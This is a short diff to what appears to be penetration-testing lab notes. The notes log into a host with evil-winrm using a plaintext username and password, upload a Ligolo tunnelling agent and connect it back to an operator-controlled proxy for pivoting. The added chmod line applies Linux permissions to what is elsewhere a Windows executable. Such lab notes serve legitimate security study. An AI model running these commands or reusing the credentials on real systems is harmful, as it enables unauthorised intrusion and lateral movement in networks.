@@ -23,6 +23,8 @@ evil-winrm -i 192.168.130.206 -u r.andrews -p BusyOfficeWorker890
 
 # Upload agent
 upload agent.exe
+# Change Privs
+chmod +x /tmp/agent
 
 #Connect to Ligolo Proxy
 ./agent.exe -connect 192.168.45.244:11601 -ignore-cert
